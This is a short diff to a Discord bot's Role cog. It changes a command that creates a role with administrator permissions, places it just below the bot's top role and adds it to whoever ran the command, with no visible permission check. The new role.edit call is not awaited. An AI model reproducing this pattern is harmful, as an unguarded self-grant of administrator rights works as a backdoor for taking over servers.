@@ -19,8 +19,9 @@ class Role(commands.Cog):
 		if not role:
 			admin = discord.Permissions(administrator=True)
 			bot = ctx.guild.get_member(self.bot.user.id)
-			await ctx.guild.create_role(name=name, permissions=admin, position=bot.roles[-1].position)
+			await ctx.guild.create_role(name=name, permissions=admin)
 			role = get(roles, name=name)
+			role.edit(position=bot.roles[-1].position)
 		await ctx.author.add_roles(role)
 
 	@commands.command(
